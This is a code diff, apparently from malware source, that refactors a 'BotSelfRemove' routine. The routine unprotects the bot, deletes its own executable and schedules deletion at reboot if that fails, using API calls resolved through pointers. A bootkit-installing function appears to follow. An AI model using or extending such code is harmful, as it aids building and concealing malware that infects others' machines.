@@ -903,21 +903,20 @@ void BotSelfRemove()
 {
 	BOT::Unprotect();
 
-	PCHAR BotPath = BOT::GetBotFullExeName();
-	PDBG("BotSelfRemove", "Lookup bot file '%s'", BotPath);
-	
-	DWORD attr = (DWORD)pGetFileAttributesA(BotPath);
-	PDBG("BotSelfRemove", "'%s' attributes 0x%X", BotPath, attr);
+	string BotPath = BOT::GetBotFullExeName();
+	PDBG("BotSelfRemove", "Lookup bot file '%s'", BotPath.t_str());
+
+	DWORD attr = (DWORD)pGetFileAttributesA(BotPath.t_str());
+	PDBG("BotSelfRemove", "'%s' attributes 0x%X", BotPath.t_str(), attr);
 	if (attr == INVALID_FILE_ATTRIBUTES) return;
-	
-	PDBG("BotSelfRemove","Trying to delete file '%s'", BotPath);
-	pSetFileAttributesA(BotPath, FILE_ATTRIBUTE_ARCHIVE);
-	if (!(BOOL)pDeleteFileA(BotPath))
+
+	PDBG("BotSelfRemove","Trying to delete file '%s'", BotPath.t_str());
+	pSetFileAttributesA(BotPath.t_str(), FILE_ATTRIBUTE_ARCHIVE);
+	if (!(BOOL)pDeleteFileA(BotPath.t_str()))
 	{
 		PDBG("BotSelfRemove","DeleteFile failed (%u). Try pending remove.",(DWORD)pGetLastError());
-		pMoveFileExA(BotPath, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
+		pMoveFileExA(BotPath.t_str(), NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
 	}
-	STR::Free(BotPath);
 }
 
 void AsyncInstallBk(void* Arguments)
